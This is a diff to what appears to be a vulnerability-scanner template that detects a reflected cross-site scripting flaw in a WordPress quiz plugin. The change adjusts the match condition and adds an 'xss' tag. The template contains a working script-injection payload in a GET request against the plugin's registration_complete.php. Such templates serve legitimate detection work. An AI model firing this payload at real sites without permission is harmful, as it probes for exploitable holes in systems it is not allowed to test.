@@ -3,7 +3,7 @@ http:
   - condition: and
     dsl:
     - status_code == 200
-    - contains(body, "quizzes/flashcard") && contains(body, "</script><script>alert(document.domain)</script>")
+    - contains_all(body, "quizzes/flashcard", "</script><script>alert(document.domain)</script>")
     type: dsl
   raw:
   - 'GET /wp-content/plugins/qwiz-online-quizzes-and-flashcards/registration_complete.php?&qname=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
@@ -30,4 +30,4 @@ info:
   - https://wordpress.org/plugins/qwiz-online-quizzes-and-flashcards/
   remediation: Fixed in version 3.37
   severity: medium
-  tags: wordpress,wp-plugin,wp,wpscan,packetstorm,qwiz-online-quizzes-and-flashcards
+  tags: wordpress,wp-plugin,wp,wpscan,packetstorm,qwiz-online-quizzes-and-flashcards,xss
